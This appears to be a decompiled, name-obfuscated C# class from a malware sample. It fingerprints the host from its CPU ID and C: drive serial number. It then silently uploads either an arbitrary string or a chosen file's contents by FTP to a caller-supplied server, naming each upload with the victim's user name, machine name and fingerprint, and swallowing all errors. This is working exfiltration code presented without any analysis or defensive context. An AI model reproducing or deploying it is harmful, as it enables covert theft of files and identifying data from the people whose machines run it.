using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace oEqFtKwIikP;

internal sealed class ccEPHgfBCGDXR
{
	public static string QtJLMTqxBPh()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void ISlJkSqNIOOKS(string VZfBJeQAhhgb = "URL", string IUfoiBtJglC = "USERNAME", string NWclkgiypmhH = "ACCESO", string nqyVcgcqVYJD = "")
	{
		try
		{
			string text = QtJLMTqxBPh();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(VZfBJeQAhhgb + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(IUfoiBtJglC, NWclkgiypmhH);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(nqyVcgcqVYJD);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void ocQfPPuxiOJiT(string aMRsFPvxJvznB = "URL", string GEayBimjKJJqi = "USERNAME", string FCKWQTFNesC = "ACCESO", string IumcHTtzUbcN = "")
	{
		try
		{
			string text = QtJLMTqxBPh();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(aMRsFPvxJvznB + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(GEayBimjKJJqi, FCKWQTFNesC);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(IumcHTtzUbcN))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}
}
